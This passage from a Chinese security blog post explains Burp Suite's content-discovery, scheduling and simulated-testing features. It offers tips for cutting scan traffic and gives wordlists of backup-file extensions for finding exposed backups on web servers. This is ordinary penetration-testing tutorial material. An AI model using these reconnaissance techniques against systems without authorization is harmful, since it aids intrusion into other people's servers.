<figure data-type="image" tabindex="17"><img src="https://mstwiki.acmesec.cn/static/uploads/1c7bdd51-7f22-4aae-b4d3-d3182c7a79f9.jpg" alt="/static/uploads/1c7bdd51-7f22-4aae-b4d3-d3182c7a79f9.jpg" loading="lazy"></figure>
<p>默认配置就是这四项了，下面具体分析一下他扫描的流量，取其精华。</p>
<h4 id="0x06_2-扫描分析">0x06_2 扫描分析</h4>
<p>流程1:</p>
<figure data-type="image" tabindex="18"><img src="https://mstwiki.acmesec.cn/static/uploads/e16ed5cd-e230-4251-932f-c5dead9b9924.jpg" alt="/static/uploads/e16ed5cd-e230-4251-932f-c5dead9b9924.jpg" loading="lazy"></figure>
<p>先去除所有文件的后缀以及提取目录名当作文件扫一遍。</p>
<p>流程2:</p>
<figure data-type="image" tabindex="19"><img src="https://mstwiki.acmesec.cn/static/uploads/1da2ca8b-ee53-46e8-aa3c-97d3f77d9985.jpg" alt="/static/uploads/1da2ca8b-ee53-46e8-aa3c-97d3f77d9985.jpg" loading="lazy"></figure>
<p>在所有去了后缀的文件名后面加上<code>Test these extentsions</code>配置中的所有后缀并进行扫描，在已知站点语言的情况下此处明显多了很多无效流量。</p>
<p>流程3:</p>
<figure data-type="image" tabindex="20"><img src="https://mstwiki.acmesec.cn/static/uploads/0a2b7646-d46e-4d15-9854-1ab5f2740fd1.jpg" alt="/static/uploads/0a2b7646-d46e-4d15-9854-1ab5f2740fd1.jpg" loading="lazy"></figure>
<p>将流程1中的所有文件名当作目录扫一遍。</p>
<p>流程4:</p>
<figure data-type="image" tabindex="21"><img src="https://mstwiki.acmesec.cn/static/uploads/5b4eca82-88dd-4c19-bf1e-f44986131d9c.jpg" alt="/static/uploads/5b4eca82-88dd-4c19-bf1e-f44986131d9c.jpg" loading="lazy"></figure>
<p>按照配置中Filenames中的字典顺序依次遍历并结合流程2的方式遍历文件。</p>
<p>流程5:</p>
<p>依次在每层目录执行一遍流程1-4，如果新目录或文件发现就添加到列队里面。</p>
<h4 id="0x06_3-优化扫描">0x06_3 优化扫描</h4>
<figure data-type="image" tabindex="22"><img src="https://mstwiki.acmesec.cn/static/uploads/2fb555a0-a4d9-4c34-8d2b-d4dc9e4a683e.png" alt="/static/uploads/2fb555a0-a4d9-4c34-8d2b-d4dc9e4a683e.png" loading="lazy"></figure>
<p>缺陷很明显，仅仅三个目录三个文件总共请求了14048次，流量超过20M。</p>
<p>递归扫描产生的无效流量太多了。</p>
<p>首要原因出现在:</p>
<figure data-type="image" tabindex="23"><img src="https://mstwiki.acmesec.cn/static/uploads/d354e20c-8b49-49e3-9706-210dc440689f.jpg" alt="/static/uploads/d354e20c-8b49-49e3-9706-210dc440689f.jpg" loading="lazy"></figure>
<p>大多数时候，已知语言情况下完全没必要吧所有后缀都跑一遍，留特定语言以及相关后缀。如st2时加上.action/.do,流量去掉大半。</p>
<p>其次出现在:</p>
<figure data-type="image" tabindex="24"><img src="https://mstwiki.acmesec.cn/static/uploads/02d3d5c9-89e5-4ca4-96e2-68d36f1f062d.jpg" alt="/static/uploads/02d3d5c9-89e5-4ca4-96e2-68d36f1f062d.jpg" loading="lazy"></figure>
<p>此处主要针对扫备份，原生字典长这样:</p>
<pre><code>bac
BAC
backup
BACKUP
bak
BAK
conf
cs
csproj
gz
inc
INC
ini
java
log
lst
old
OLD
orig
ORIG
sav
save
tar
temp
tmp
TMP
vb
vbproj
zip
$$$
-OLD
-old
0
1
~1
~bk
</code></pre>
<p>主要针对国外的站吧。这里提供一份。</p>
<pre><code>txt
md
xml
db
7z
rar
zip
gz
tar
tar.gz
sql
bak
swp
old
properties
inc
ini
mdb
mdf
conf
config
log
rar
</code></pre>
<p>最后是字典的选择：</p>
<figure data-type="image" tabindex="25"><img src="https://mstwiki.acmesec.cn/static/uploads/a0e1fe7b-10c3-4288-8398-7684a17590a7.png" alt="/static/uploads/a0e1fe7b-10c3-4288-8398-7684a17590a7.png" loading="lazy"></figure>
<p>burp内置的4个字典内容重复率极高，比如about这个词在四个字典里都分别出现了...四个字典共3266个，去重后2265个。</p>
<p>结果保存在：</p>
<pre><code>https://raw.githubusercontent.com/TheKingOfDuck/myScripts/master/burp_dir.txt
</code></pre>
<p>文件名方面推荐：</p>
<pre><code>https://raw.githubusercontent.com/TheKingOfDuck/myScripts/master/burp_filenames.txt
</code></pre>
<figure data-type="image" tabindex="26"><img src="https://mstwiki.acmesec.cn/static/uploads/4e84215b-6f57-434d-8943-766a49cfe1d6.jpg" alt="/static/uploads/4e84215b-6f57-434d-8943-766a49cfe1d6.jpg" loading="lazy"></figure>
<p>如此一来在扫描目录的过程也可把备份一并扫了。</p>
<figure data-type="image" tabindex="27"><img src="https://mstwiki.acmesec.cn/static/uploads/010baabc-e71c-45b6-a34f-0263fd70699f.jpg" alt="/static/uploads/010baabc-e71c-45b6-a34f-0263fd70699f.jpg" loading="lazy"></figure>
<hr>
<h3 id="0x06-schedule-task-定时任务">0x06 Schedule task  定时任务</h3>
<p>选择目标右键打开后如下图：</p>
<figure data-type="image" tabindex="28"><img src="https://thekingofduck.github.io/post-images/Schedule1.png" alt="Schedule2" loading="lazy"></figure>
<p>定时任务，没啥特别的值得说。</p>
<p>0x07 Simulate manual testing 人工模拟</p>
<pre><code>This function sends common test payloads to random URL s and parameters at irregular intervals, to generate traflic similar to that caused by manual penetration testing. Its only real use is to let you take a break from testing while still looking busy according to the server's logs. Only items which you selected in the site map will be requested.
</code></pre>
<p>正如功能描述中所说的，这是一个懒人挖洞选项。</p>
<figure data-type="image" tabindex="29"><img src="https://thekingofduck.github.io/post-images/Simulate1.png" alt="Simulate1" loading="lazy"></figure>
<p>缺陷很明显，不会自动寻找并提交表单，只能依托于已有的表单/参数的基础上进行探测，相当于一款被动扫描器。结合Discover content使用，法力无边。</p>
<h3 id="0x08-总结">0x08 总结</h3>
<p>熟练使用这些作战功能，扫描器从此是路人。</p>
<p>技术交流：https://github.com/TheKingOfDuck</p>
]]></content>
    </entry>
</feed>